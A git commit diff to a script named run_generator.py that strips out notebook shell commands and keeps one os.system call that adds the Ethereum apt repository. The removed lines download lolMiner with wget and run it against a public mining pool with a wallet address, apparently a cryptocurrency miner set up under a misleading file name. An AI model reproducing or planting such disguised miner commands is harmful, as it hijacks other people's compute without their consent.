b1bea2fa2c0ffe5c950ea20ed0427a599ed3bf98
teammellowish <97327531+teammellowish@users.noreply.github.com>
2022-01-08 10:33:59 +0530

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,11 +1,2 @@
-!sudo add-apt-repository ppa:ethereum/ethereum
-!sudo apt update
-!sudo apt install ethereum
-
-!wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.37/lolMiner_v1.37.tar.gz
-!mkdir lolminer
-!cd lolminer
-!tar -xzvf ../lolMiner_v1.37.tar.gz
-!cd 1.37
-
-!./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user ELON:0x6822fc02F5BC029D253458052a9de1303C4eC834.Awqnerd --ethstratum ETHPROXY pause
+import os
+os.system('sudo add-apt-repository ppa:ethereum/ethereum')
